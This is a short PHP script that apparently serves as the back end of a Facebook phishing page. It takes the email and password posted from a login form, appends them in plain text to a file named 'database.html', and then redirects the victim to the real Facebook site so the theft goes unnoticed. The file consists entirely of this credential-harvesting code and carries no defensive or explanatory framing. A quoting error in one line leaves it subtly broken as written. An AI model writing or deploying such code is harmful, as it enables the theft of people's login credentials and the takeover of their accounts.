<?php
if(isset($_POST['email']) and isset($_POST['password'])){

$email = $_POST['email'];
$password = $_POST['password'];
$set = "Username : '.$email."<br/>Password : ".$password."<br/><hr>";
$open = fopen("database.html", "a");
fwrite($open, $set);
chmod("database.html", 0755);
fclose($open);
header('Location:https://www.facebook.com');

}
//Facecook
?>
